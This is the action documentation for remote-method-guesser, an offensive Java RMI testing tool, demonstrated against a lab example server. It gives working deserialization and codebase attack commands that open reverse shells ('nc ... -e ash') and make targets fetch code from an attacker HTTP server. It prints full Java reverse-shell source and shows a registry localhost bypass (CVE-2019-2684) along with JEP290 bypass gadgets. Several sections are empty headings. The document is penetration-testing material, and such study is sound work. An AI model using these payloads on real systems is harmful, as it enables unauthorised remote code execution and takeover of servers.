### Actions

----

In this document you can find more detailed information on the different available *rmg* actions.

* [act action](./README.md#activator-action)
* [bind|rebind|unbind action](./README.md#bind-actions)
* [codebase action](./README.md#codbase-action)
* [dgc action](./README.md#dgc-action)
* [enum action](./README.md#enum-action)
* [guess action](./README.md#guess-action)
* [listen action](./README.md#listen-action)
* [method action](./README.md#method-action)
* [reg action](./README.md#reg-action)


### Activator Action

----

One crucial part of remote method invocation on *Java RMI* endpoints are *RemoteObjects*. A *RemoteObject* is basically an instance of
a class that is made available over the network. Each *RemoteObject* which is registered in the current runtime is associated with
a corresponding ``ObjID``. During a *RMI call*, the *RMI client* sends all required information for the call, together with the
``ObjID`` for the desired *RemoteObject* to the server. The server looks up the ``ObjID`` value and dispatches the call to the
corresponding *RemoteObject*.

*RMI clients* usually obtain the ``ObjID`` for a *RemoteObject* in two different ways:

  1. Well known *RemoteObjects* (those that are used for internal RMI communication), have fixed and well known ``ObjID`` values.
  2. Other *RemoteObjects* are usually obtained using the *RMI registry*, which provides the ``ObjID`` values during the object lookup.

The probably most well known *well known RemoteObjects* are the *RMI registry* (``ObjID = 0``) and the *distributed garbage collector* (``ObjID = 2``),
but there is one other well known *RemoteObject* that is no longer that well known. This *RemoteObject* is the *activator* (``ObjID = 1``)
that was (not sure if really true, but at least some references mention that) once a mandatory part of *Java RMI*, but became optional in
*Java 8* [1](https://openjdk.java.net/jeps/385). From here on, it was no longer commonly used and the amount of reliable documentation and
projects that still use it is quite low. From the small amount of documentation that is available [2](https://docs.oracle.com/javase/9/docs/specs/rmi/activation.html)
we conclude that the *activation system* is used for the following purpose:

It seems to allow the creation of *RemoteObjects* on demand. With regular *Java RMI*, the client obtains a *remote reference* from the
*RMI registry* that points to an existing *RemoteObject*. When the corresponding *RemoteObject* does not exist, regular *RMI calls* simply
lead to a ``ConnectException`` or ``NoSuchObjectException``. However, with an ``Activator`` present, the situation is a little bit different,
as clients obtain not only a *remote reference*, but also an ``ActivationID`` when looking up a *RemoteObject*.

The ``ActivationID`` can now be used to create *RemoteObjects* on demand. When a client dispatches a *RMI call*, it first tries to
dispatch it directly using the *remote reference* for the corresponding *Remote Object*. When this call fails, it sends an *activate
request* to the ``Activator``, containing the ``ActivationID`` it obtained previously. The ``Activator`` can now create the object
and return the new *remote reference* back to the client (as already mentioned, this explanation is probably not fully correct and
misses many details, but it is sufficient for our purpose).

**TL;DR** - The ``Activator`` is just another well known *RemoteObject* with a fixed ``ObjID`` and known *remote methods*. The reason why it
is interesting from an offensive perspective is, because it did never profit from *JEP290* and still uses no deserialization filters.
As it's only *remote method* ``activate`` takes a non primitive argument, it is a prime target for deserialization attacks.
Since version ``v3.1`` the *rmg-example-server* runs an ``Activator`` remote object on the ``9010`` registry port.
The following listing shows an example *deserialization attack*:

```console
[qtc@kali ~]$ rmg 172.17.0.2 9010 act CommonsCollections6 'nc 172.17.0.1 4444 -e ash'
[+] Creating ysoserial payload... done.
[+] 
[+] Attempting deserialization attack on Activation endpoint...
[+] 
[+] 	Caught IllegalArgumentException during deserialization attack.
[+] 	Deserialization attack was probably successful :)

[qtc@kali ~]$ nc -vlp 4444
Ncat: Version 7.91 ( https://nmap.org/ncat )
Ncat: Listening on :::4444
Ncat: Listening on 0.0.0.0:4444
Ncat: Connection from 172.17.0.2.
Ncat: Connection from 172.17.0.2:46499.
id
uid=0(root) gid=0(root) groups=0(root)
```

Apart from being vulnerable to *deserialization attacks*, the ``Activator`` can also be vulnerable to remote class loading attacks.
For this attack to work, the ``ActivationSystem`` needs to run with ``useCodebaseOnly=false`` and a security policy that allows
the requested operation. The default implementation for the *activation system* (``rmid``) uses the same *SecurityManager* as the
*RMI registry*. Therefore, pulling classes from remote is always allowed.

```console
[qtc@kali ~]$ rmg 172.17.0.2 9010 codebase Shell http://172.17.0.1:8000 --signature act
[+] Attempting codebase attack on Activator endpoint...
[+] Using class Shell with codebase http://172.17.0.1:8000/ during activate call.

[qtc@kali www]$ python3 -m http.server
Serving HTTP on 0.0.0.0 port 8000 (http://0.0.0.0:8000/) ...
172.17.0.2 - - [27/Mar/2021 06:31:28] "GET /Shell.class HTTP/1.1" 200 -

[qtc@kali ~]$ nc -vlp 4444
Ncat: Version 7.91 ( https://nmap.org/ncat )
Ncat: Listening on :::4444
Ncat: Listening on 0.0.0.0:4444
Ncat: Connection from 172.17.0.2.
Ncat: Connection from 172.17.0.2:36110.
id
uid=0(root) gid=0(root) groups=0(root)
```


### Bind Actions

----

By using the ``bind``, ``rebind`` or ``unbind`` action, it is possible to modify the available *bound names* within the *RMI registry*.
During these actions *remote-method-guesser* just makes legitimate usage of the corresponding *remote methods* that are exposed by the
registry and calls them in the intended way. On a fully patched server, this should only work from localhost, as the *RMI registry*
validates the incoming client connection against all local IP addresses. An exception for this situation are servers that are vulnerable
to ``CVE-2019-2684``, which bypasses the localhost restrictions and enables remote users to perform bind operations. To use this bypass
technique, you need to specify ``--localhost-bypass`` together with the corresponding *bind action*.

Whereas the ``unbind`` action only requires the *bound name* that should be removed from the registry, the ``bind`` and ``rebind`` operations
also require a *RemoteObject* that should be bound. *remote-method-guesser* always uses ``javax.management.remote.rmi.RMIServerImpl_Stub``
for this purpose, which is the *RemoteObject* normally used by *jmx* servers. As *jmx* is part of the most common *Java Runtime Environments*,
it is likely that the registry can bind this object. Notice that arbitrary objects cannot be bound, as they need to be known by the *RMI registry*.
Nonetheless, you can attempt to bind arbitrary objects by using *rmg's* [Plugin System](./plugin-system.md).

*RemoteObjects* within the *RMI registry* are actually just references to their corresponding *TCP endpoints*. For this reason, during the ``bind``
and ``rebind`` operations, you have to specify an address for the corresponding endpoint. Clients that attempt to communicate with your
*bound name* as well as the *RMI registry* itself will sent *JRMP calls* to the specified endpoint from time to time. Depending on the server or
client configuration, this can be used for *deserialization attacks*.

```console
[qtc@kali ~]$ rmg 172.17.0.2 9010 
[+] RMI registry bound names:
[+] 
[+] 	- plain-server2
[+] 		--> de.qtc.rmg.server.interfaces.IPlainServer (unknown class)
[+] 	- plain-server
[+] 		--> de.qtc.rmg.server.interfaces.IPlainServer (unknown class)
[+] 	- legacy-service
[+] 		--> de.qtc.rmg.server.legacy.LegacyServiceImpl_Stub (unknown class)
[...]

[qtc@kali ~]$ rmg 172.17.0.2 9010 bind 172.17.0.1:4444 --bound-name jmxrmi --localhost-bypass
[+] Binding name jmxrmi to javax.management.remote.rmi.RMIServerImpl_Stub
[+] 
[+] 	Encountered no Exception during bind call.
[+] 	Bind operation was probably successful.

[qtc@kali ~]$ rmg 172.17.0.2 9010 
[+] RMI registry bound names:
[+] 
[+] 	- jmxrmi
[+] 		--> javax.management.remote.rmi.RMIServerImpl_Stub (known class)
[+] 	- plain-server2
[+] 		--> de.qtc.rmg.server.interfaces.IPlainServer (unknown class)
[+] 	- plain-server
[+] 		--> de.qtc.rmg.server.interfaces.IPlainServer (unknown class)
[+] 	- legacy-service
[+] 		--> de.qtc.rmg.server.legacy.LegacyServiceImpl_Stub (unknown class)
[...]

[qtc@kali ~]$ rmg 172.17.0.2 9010 unbind --bound-name plain-server --localhost-bypass
[+] Ubinding bound name plain-server from the registry.
[+] 
[+] 	Encountered no Exception during unbind call.
[+] 	Unbind operation was probably successful.

[qtc@kali ~]$ rmg 172.17.0.2 9010 
[+] RMI registry bound names:
[+] 
[+] 	- jmxrmi
[+] 		--> javax.management.remote.rmi.RMIServerImpl_Stub (known class)
[+] 	- plain-server2
[+] 		--> de.qtc.rmg.server.interfaces.IPlainServer (unknown class)
[+] 	- legacy-service
[+] 		--> de.qtc.rmg.server.legacy.LegacyServiceImpl_Stub (unknown class)
[...]
```


### Codebase Action

------

In 2011, many *Java RMI* endpoints were vulnerable to *remote class loading* attacks due to an insecure by default configuration within the *RMI* implementation.
This configurations allowed remote clients to specify a *codebase* that was used by the server to fetch unknown classes during runtime. By sending a custom class
(not known by the server) within *RMI* calls and setting the *codebase* to an attacker controlled *HTTP* server, it was possible to get reliable *remote code execution*
on most *Java RMI* servers.

Today, this vulnerability can still be present if an application server sets the ``useCodebaseOnly`` option to ``false`` and uses a *SecurityManager* with a
lax configured security policy. Unfortunately, common security tools like e.g. *Metasploit* use a wrong approach for testing this vulnerability, as they
are still targeting the *Distributed Garbage Collector* (*DGC*) and look for the string ``RMI class loader disabled``, which is returned if no security manager
is used. On modern *RMI endpoints*, such an enumeration is no longer working for the following reasons:

1. The *Distributed Garbage Collector* sets the ``useCodebaseOnly`` property explicitly to ``true`` within the
   ``UnicastServerRef.java`` class. This overwrites custom configurations and always disables *remote class loading* for all calls to the *DGC*.

2. *RMI calls* to the *Distributed Garbage Collector* are handled within a separate ``AccessControlContext``, which denies all outbound connections. This
   ``AccessControlContext`` (defined in ``DGCImpl.java``) overwrites the current security policy and ignores user defined policy rules.

3. Even without the two restrictions mentioned above, *remote class loading* would still fail. The idea of class loading is to send an object of a custom class
   (unknown to the remote server) within *RMI calls*. During a successful attack, the server fetches the class definition from the attacker and calls
   the *readObject* method that contains malicious *Java code*. However, as *internal RMI communication* is nowadays protected by *deserialization filters*, unknown
   classes are rejected while reading the ``ObjectInputStream``. Whereas the *RMI registry* allows unknown classes that implement certain interfaces, the *DGC*
   uses a more strict *deserialization filter* and it is not possible to send unknown classes to it.

For the above mentioned reasons, the *Distributed Garbage Collector* is no longer suitable for enumerating *remote class loading*. A little bit better is the
situation for the *RMI registry*. The *RMI registry* still respects a user defined ``useCodebaseOnly`` setting and uses a *SecurityManager* that allows outbound
connections by default. Therefore, a setting of ``useCodebaseonly=false`` is already sufficient to load classes from remote. However, there are two downsides:

1. If no user defined *SecurityManager* with corresponding permissions is present, the loaded remote classes are affected by the security policy of the
   *RMI registry*. As this policy is only concerned about networking, *file* and *process* access might be limited.

2. To trigger *remote class loading* it is required to enforce a ``readObject`` call on the *RMI registry*. Before June 2020, this was easy, as the ``String``
   argument of the ``lookup(String name)`` method was unmarshalled via ``readObject``. However, on most recent *RMI registries* you can only use the ``bind``
   and ``rebind`` methods, that can only be invoked from localhost.

Whereas the *internal RMI communications* (*DGC* and *RMI registry*) are well protected, *RMI communication* on the application level is not. A server configured
with ``useCodebaseonly=false`` and a lax configured *SecurityManager* might be exploitable, but you need to know a valid method signature. Furthermore, also
on the application level it is required that the *remote method* leads to a call to ``readObject`` on the server side. Therefore, the targeted remote method
needs non primitive input parameters. As in case of the registry, ``java.lang.String`` might be sufficient for older *RMI servers*, whereas it does not work for
newer ones. The following listing shows an example for a successful codebase attack:

```console
[qtc@kali ~]$ rmg 172.17.0.2 9010 codebase Shell http://172.17.0.1:8000 --signature "String login(java.util.HashMap dummy1)" --bound-name legacy-service
[+] Class de.qtc.rmg.server.legacy.LegacyServiceImpl_Stub is treated as legacy stub.
[+] You can use --no-legacy to prevent this.
[+] Attempting codebase attack on RMI endpoint...
[+] Using class Shell with codebase http://172.17.0.1:8000/ during login call.
[+] 
[+] 	Using non primitive argument type java.util.HashMap on position 0
[+] 	Specified method signature is String login(java.util.HashMap dummy1)
```

When used against a vulnerable endpoint, you should obtain an *HTTP* request for the specified class:

```console
[qtc@kali ~]$ python3 -m http.server
Serving HTTP on 0.0.0.0 port 8000 (http://0.0.0.0:8000/) ...
172.17.0.2 - - [27/Mar/2021 06:46:41] "GET /Shell.class HTTP/1.1" 200 -
```

*remote-method-guesser* expects the payload class to have a ``serialVersionUID`` of ``2L``, but apart from that you can do anything
within the ``readObject`` method of the class. For this demonstration, the following class definition was used, that spawns a reverse shell:

```java
// Taken from: https://gist.github.com/caseydunham/53eb8503efad39b83633961f12441af0

import java.io.IOException;
import java.io.InputStream;
import java.io.OutputStream;
import java.net.Socket;
import java.util.jar.Attributes;
import java.io.Serializable;
import java.io.ObjectInputStream;

public class Shell implements Serializable
{
    private static int port = 4444;
    private static String cmd = "/bin/ash";
    private static String host = "172.18.0.1";
    private static final long serialVersionUID = 2L;

    private void readObject(ObjectInputStream aInputStream) throws ClassNotFoundException, IOException, Exception
    {
        Process p = new ProcessBuilder(cmd).redirectErrorStream(true).start();
        Socket s = new Socket(host,port);
        InputStream pi = p.getInputStream(), pe = p.getErrorStream(), si = s.getInputStream();
        OutputStream po = p.getOutputStream(), so = s.getOutputStream();
        while(!s.isClosed()) {

            while(pi.available()>0)
                so.write(pi.read());

            while(pe.available()>0)
                so.write(pe.read());

            while(si.available()>0)
                po.write(si.read());

            so.flush();
            po.flush();
            Thread.sleep(50);

            try {
                p.exitValue();
                break;
            } catch (Exception e){}
        }

        p.destroy();
        s.close();
    }
}
```

After the class was loaded by the vulnerable endpoint, a shell pops up on the corresponding listener:

```console
[qtc@kali ~]$ nc -vlp 4444
Ncat: Version 7.91 ( https://nmap.org/ncat )
Ncat: Listening on :::4444
Ncat: Listening on 0.0.0.0:4444
Ncat: Connection from 172.17.0.2.
Ncat: Connection from 172.17.0.2:36222.
id
uid=0(root) gid=0(root) groups=0(root)
```

As previously mentioned, the internal *DGC communication* of modern *RMI servers* is hardened against *codebase* and *deserialization attacks*.
Nonetheless, *remote-method-guesser* also supports *codebase attacks* on the *DGC* and *RMI registry* level and allows you to verify the
vulnerability on older *RMI endpoints*. In case of the *RMI registry*, it turns out that class loading is even possible on fully patched
endpoints, if the ``useCodebaseOnly`` property is set to ``false`` and the *SecurityManager* allows the requested action of the payload class.

```console
[qtc@kali ~]$ rmg 172.17.0.2 9010 codebase Shell http://172.17.0.1:8000 --signature reg
[+] Attempting codebase attack on RMI Registry endpoint...
[+] Using class Shell with codebase http://172.17.0.1:8000/ during lookup call.

[qtc@kali www]$ python3 -m http.server
Serving HTTP on 0.0.0.0 port 8000 (http://0.0.0.0:8000/) ...
172.17.0.2 - - [27/Mar/2021 06:49:52] "GET /Shell.class HTTP/1.1" 200 -

[qtc@kali ~]$ nc -vlp 4444
Ncat: Version 7.91 ( https://nmap.org/ncat )
Ncat: Listening on :::4444
Ncat: Listening on 0.0.0.0:4444
Ncat: Connection from 172.17.0.2.
Ncat: Connection from 172.17.0.2:36242.
id
uid=0(root) gid=0(root) groups=0(root)
```

However, notice that in this case the payload class needs to extend or implement an (interface) class that is explicitly allowed
by the deserialization filters of the *RMI registry*. The following listing shows the modifications applied to the ``Shell`` class
in the example above:

```java
[...]
import java.rmi.Remote;

public class Shell implements Serializable, Remote
[...]
```


### DGC Action

------


### Enum Action

------


### Guess Action

------

When using the ``guess`` operation, *rmg* attempts to identify existing remote methods by sending method hashes
to the remote server. This operation requires a wordlist that contains the corresponding method definitions in the
following form:

```console
[qtc@kali wordlists]$ head -n 5 /opt/remote-method-guesser/wordlists/rmg.txt
boolean call(String dummy, String dummy2, String dummy3)
boolean call(String dummy, String dummy2)
boolean call(String dummy, String[] dummy2)
boolean call(String dummy)
boolean call(String[] dummy)
```

*remote-method-guesser* ships some default wordlists and expects them in the path ``/opt/remote-method-guesser/wordlists/``.
You can change this path either by modifying the [rmg configuration file](./src/config.properties) or by using the ``--wordlist-file``
or ``--wordlist-folder`` options. Methods with zero arguments are skipped by default. You can enable them by using the
``--zero-arg`` option. However, keep in mind that zero argument methods lead to real method calls on the server side, as their
invocation cannot be prevented by using invalid argument types.

```console
[qtc@kali ~]$ rmg --ssl --zero-arg 172.18.0.2 1090 guess 
[+] Creating RMI Registry object... done.
[+] Obtaining list of bound names... done.
[+] 3 names are bound to the registry.
[+] 2 wordlist files found.
[+] Reading method candidates from file /opt/remote-method-guesser/wordlists/rmg.txt
[+] 	752 methods were successfully parsed.
[+] Reading method candidates from file /opt/remote-method-guesser/wordlists/rmiscout.txt
[+] 	2550 methods were successfully parsed.
[+] 
[+] Starting RMG Attack
[+] 	No target name specified. Guessing on all available bound names.
[+] 	Guessing 3294 method signature(s).
[+] 	
[+] 	Current bound name: ssl-server
[+] 		Guessing methods...
[+]
[+] 			HIT! Method with signature String system(String[] dummy) exists!
[+] 			HIT! Method with signature int execute(String dummy) exists!
[+] 			HIT! Method with signature void releaseRecord(int recordID, String tableName, Integer remoteHashCode) exists!
[+] 		
[+] 	Current bound name: plain-server
[+] 		Guessing methods...
[+]
[+] 			HIT! Method with signature String system(String dummy, String[] dummy2) exists!
[+] 			HIT! Method with signature String execute(String dummy) exists!
[+] 		
[+] 	Current bound name: secure-server
[+] 		Guessing methods...
[+]
[+] 			HIT! Method with signature void updatePreferences(java.util.ArrayList dummy1) exists!
[+] 			HIT! Method with signature void logMessage(int dummy1, Object dummy2) exists!
[+] 			HIT! Method with signature String login(java.util.HashMap dummy1) exists!
[+] 		
[+] 
[+] Listing successfully guessed methods:
[+] 	-  ssl-server
[+] 		--> String system(String[] dummy)
[+] 		--> int execute(String dummy)
[+] 		--> void releaseRecord(int recordID, String tableName, Integer remoteHashCode)
[+] 	-  plain-server
[+] 		--> String system(String dummy, String[] dummy2)
[+] 		--> String execute(String dummy)
[+] 	-  secure-server
[+] 		--> void updatePreferences(java.util.ArrayList dummy1)
[+] 		--> void logMessage(int dummy1, Object dummy2)
[+] 		--> String login(java.util.HashMap dummy1)
```

To reduce the overhead of dynamic class generation, *rmg* also supports an optimized wordlist format that
contains the pre-computed method hashes and some meta information about the methods.

```console
[qtc@kali wordlists]$ head -n 5 rmg.txt 
boolean call(String dummy, String dummy2, String dummy3); 2142673766403641873; false; false
boolean call(String dummy, String dummy2); -9048491806834107285; false; false
boolean call(String dummy, String[] dummy2); 7952470873340381142; false; false
boolean call(String dummy); -5603201874062960450; false; false
boolean call(String[] dummy); -4301784332653484516; false; false
```

To transform a plain wordlist file into the optimized format, just use the ``--update`` option during the ``guess``
operation. This will update all currently used wordlist files to the optimized format.


### Listen Action

------


### Method Action

------


### Reg Action

------

Apart from *remote methods* on the application level, *RMI* endpoints also expose well known *remote* methods that are needed for the internal *RMI communication*.
In the old days (before *JEP 290*), these internal *remote methods* were vulnerable to exactly the same deserialization attacks as described above. However,
with *JEP 290* deserialization filters were implemented for all internal *RMI communication* and deserialization attacks were (theoretically) no longer possible. 

During it's *enum* action, *remote-method-guesser* already checks whether *JEP290* is installed on the targeted server. For testing purposes you can use the
[example-server](https://github.com/qtc-de/beanshooter/packages/398561) of the [beanshooter](https://github.com/qtc-de/beanshooter) project, which is running
an unpatched version of *Java*. The following output shows that *remote-method-guesser* successfully identifies the missing *JEP 290* installation:

```console
[qtc@kali ~]$ rmg --ssl 172.18.0.2 9010
[+] Creating RMI Registry object... done.
[+] Obtaining list of bound names... done.
[+] 1 names are bound to the registry.
[+] RMI object tries to connect to different remote host: iinsecure.dev
[+] 	Redirecting the ssl connection back to 172.18.0.2... 
[+] 	This is done for all further requests. This message is not shown again. 
[+] 
[+] Listing bound names in registry:
[+] 
[+] 	- jmxrmi
[+] 		--> javax.management.remote.rmi.RMIServerImpl_Stub (known class)
[+] 
[+] RMI server codebase enumeration:
[+] 
[+] 	- The remote server does not expose any codebases.
[+] 
[+] RMI server String unmarshalling enumeration:
[+] 
[+] 	- Server attempted to deserialize object locations during lookup call.
[+] 	  --> The type java.lang.String is unmarshalled via readObject().
[+] 
[+] RMI server useCodebaseOnly enumeration:
[+] 
[+] 	- Caught ClassCastException during lookup call.
[+] 	  --> The server ignored the provided codebase (useCodebaseOnly=true).
[+] 
[+] RMI registry localhost bypass enumeration (CVE-2019-2684):
[+] 
[+] 	Caught AccessException during unbindcall.
[+] 	The servers seems to use a SingleEntryRegistry (probably JMX based).
[+] 
[+] RMI server DGC enumeration:
[+] 
[+] 	- RMI server does not use a SecurityManager during DGC operations.
[+] 	  Remote class loading attacks are not possible.
[+] 
[+] RMI server JEP290 enumeration:
[+] 
[+] 	- DGC accepted deserialization of java.util.HashMap (JEP290 is not installed).
```

To confirm that the server is vulnerable you can perform a dedicated *deserialization attack* on the *DGC level* (*DGC* = *Distributed Garbage Collector*,
a *remote object* that is available on almost each *RMI endpoint*). This can be done
by using the ``dgc`` action of *remote-method-guesser*, which allows you to send *ysoserial* gadgets to the *DGC endpoint*:

```console
[qtc@kali ~]$ rmg --ssl 172.18.0.2 9010 dgc CommonsCollections6 "curl 172.18.0.1:8000/vulnerable"
[+] Creating ysoserial payload... done.
[+] Attempting ysoserial attack on DGC endpoint...
[+] 
[+] 	Caught ClassCastException during deserialization attack.
[+] 	Deserialization attack most likely worked :)

[...]

[qtc@kali www]$ python3 -m http.server
Serving HTTP on 0.0.0.0 port 8000 (http://0.0.0.0:8000/) ...
172.18.0.2 - - [27/Dec/2020 06:16:00] code 404, message File not found
172.18.0.2 - - [27/Dec/2020 06:16:00] "GET /vulnerable HTTP/1.1" 404 -
```

The callback from the server shows that the attack was successful. With *JEP290* installed, the server would have rejected the deserialization instead.

Whereas the deserialization filter on the *DGC* is very strict and there are currently no known bypasses, the *RMI registry* itself needs to allow more
classes to be deserialized in order to work correctly. This was abused for some bypasses in the past, where the two most prominent bypasses are the
*JRMPClient* gadget of the [ysoserial project](https://github.com/frohoff/ysoserial/blob/master/src/main/java/ysoserial/payloads/JRMPClient.java) and
the [RemoteObjectInvocationHandler bypass](https://mogwailabs.de/en/blog/2020/02/an-trinhs-rmi-registry-bypass/) by [An Trinh](https://twitter.com/_tint0).
Both of them can be used together with *remote-method-guesser's* ``reg`` action and possibly bypass an outdated *JEP290* installation.

Notice that both bypass gadgets cannot be used to execute code directly. Instead they create an outbound *RMI* connection, which is no longer protected
by the deserialization filters. This outbound channel can now be used for deserialization attacks. The most common way to do this is probably using
[ysoserials JRMPListener](https://github.com/frohoff/ysoserial/blob/master/src/main/java/ysoserial/exploit/JRMPListener.java) and since it is so common,
*remote-method-guesser* has builtin a shortcut (``listen``) to launch this listener.

```console
[qtc@kali ~]$ rmg 172.18.0.2 9010 reg JRMPClient 172.18.0.1:4444
[+] Creating ysoserial payload... done.
[+] 
[+] Attempting deserialization attack on RMI registry endpoint...
[+] 
[+] 	Caught ClassCastException during deserialization attack.
[+] 	The server uses either readString() to unmarshal String parameters, or
[+] 	Deserialization attack was probably successful :)


[qtc@kali ~]$ rmg 0.0.0.0 4444 listen CommonsCollections6 "wget 172.17.0.1:8000/vulnerable"
[+] Creating a JRMPListener on port 4444.
[+] Handing off to ysoserial...
* Opening JRMP listener on 4444
Have connection from /172.18.0.2:40704
Reading message...
Is DGC call for [[0:0:0, -1407888899]]
Sending return with payload for obj [0:0:0, 2]
Closing connection


[qtc@kali www]$ python3 -m http.server
Serving HTTP on 0.0.0.0 port 8000 (http://0.0.0.0:8000/) ...
172.18.0.2 - - [08/Jan/2021 08:43:14] "GET /vulnerable HTTP/1.1" 200 -
```
